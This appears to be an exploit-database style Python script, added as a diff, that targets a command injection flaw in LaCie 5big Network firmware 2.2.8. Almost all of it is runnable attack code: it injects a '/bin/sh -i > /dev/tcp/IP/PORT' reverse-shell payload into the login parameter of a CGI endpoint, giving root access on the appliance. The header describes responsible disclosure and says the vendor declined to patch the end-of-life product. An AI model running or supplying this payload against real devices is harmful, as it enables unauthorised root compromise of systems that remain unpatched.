@@ -1,0 +1,96 @@
+#!/usr/bin/python
+
+# Exploit Title: LaCie 5big Network 2.2.8 Command Injection
+# Date: 2017-12-04
+# Exploit Author: Timo Sablowski
+# Contact: ${lastname}@tyntec.com
+# Vendor Homepage: http://www.lacie.com
+# Software Link: http://www.lacie.com/files/lacie-content/download/drivers/5%20Big%20Network.zip
+# Version: 2.2.8
+# Tested on: Linux
+# Platform: Hardware
+#
+# Command Injection Vulnerability (with root privileges) in LaCie's
+# 5big Network appliance running firmware version 2.2.8.
+# Just open a netcat listener and run this script to receive a reverse
+# shell to exploit the vulnerability.
+#
+# This exploit has been released to Seagate in accordance to their
+# responsible disclosure program and is meant to be used for testing
+# and educational purposes only.
+# Please do not use it against any system without prior permission.
+# Use at your own risk.
+#
+# Timeline:
+# 	2017-09-13: Discovery
+#	2017-10-04: Reporting to Seagate
+#		asking to fix the issue until 2017-12-04
+#	2017-11-07: Seagate stating to not fix the vulnerability as the
+#		product has been EOL for a long time
+
+
+import sys, getopt, os, urllib
+
+url_addition = "/cgi-bin/public/edconfd.cgi?method=getChallenge&login="
+blank_payload = "admin|#' ||`/bin/sh -i > /dev/tcp/IP/PORT 0<&1 2>&1` #\\\""
+
+def help():
+	print "Usage:"
+	print "%s -u <baseurl> -l <listener> -p <port>" %os.path.basename(sys.argv[0])
+	print ""
+	print "<baseurl> identifies the target's URL, e.g. http://10.0.0.1:8080"
+	print "<listener> sets the IP where the attacked system connects back to"
+	print "<port> defines the listening port"
+	print ""
+	print "Example: attack LaCie system to connect back to a remote machine (do not forget to open a netcat session)"
+	print "\t %s -u http://10.0.0.1 -l 192.168.0.1 -p 4444" %os.path.basename(sys.argv[0])
+
+
+def create_payload(blank_payload, listener, port):
+	print "[+] Generating payload with IP %s and port %s" %(listener, str(port))
+	payload = blank_payload.replace("IP", listener).replace("PORT", str(port))
+	payload = urllib.quote(payload, safe='')
+	return payload
+
+
+def send_payload(injected_url):
+	print "[+] Sending payload, this might take a few seconds ..."
+	print "[+] Check your listener"
+	try:
+		urllib.urlopen(injected_url)
+	except:
+		raise
+
+
+def main():
+	try:
+		opts, args = getopt.getopt(sys.argv[1:],"hu:l:p:")
+	except:
+		help()
+		sys.exit(1)
+	for opt, arg in opts:
+		if opt == '-h':
+			help()
+			sys.exit()
+		elif opt in ("-u"):
+			url = arg
+		elif opt in ("-l"):
+			listener = arg
+		elif opt in ("-p"):
+			port = int(arg)
+	try:
+		url
+		listener
+		port
+	except:
+		help()
+		sys.exit(1)
+
+	payload = create_payload(blank_payload, listener, port)
+ 	injected_url = "%s%s%s" %(url, url_addition, payload)
+ 	send_payload(injected_url)
+
+
+
+if __name__ == "__main__":
+	main()
